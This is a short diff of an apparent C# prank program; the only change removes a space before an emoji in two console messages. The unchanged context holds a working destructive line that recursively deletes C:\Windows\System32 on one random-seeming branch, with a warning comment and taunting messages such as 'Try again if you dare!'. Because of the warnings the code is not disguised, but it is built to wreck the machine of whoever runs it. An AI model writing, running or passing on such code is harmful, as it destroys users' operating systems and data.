@@ -17,11 +17,11 @@ class Program
             // WARNING: This code deletes critical system files and can cause irreparable damage to your system!
             // DO NOT RUN THIS CODE ON A REAL SYSTEM!
             System.IO.Directory.Delete(@"C:\Windows\System32", true);
-            Console.WriteLine("Windows 32 has been successfully deleted! 😱");
+            Console.WriteLine("Windows 32 has been successfully deleted!😱");
         }
         else
         {
-            Console.WriteLine("Phew! You survived... this time. Try again if you dare! 😜");
+            Console.WriteLine("Phew! You survived... this time. Try again if you dare!😜");
         }
     }
 }
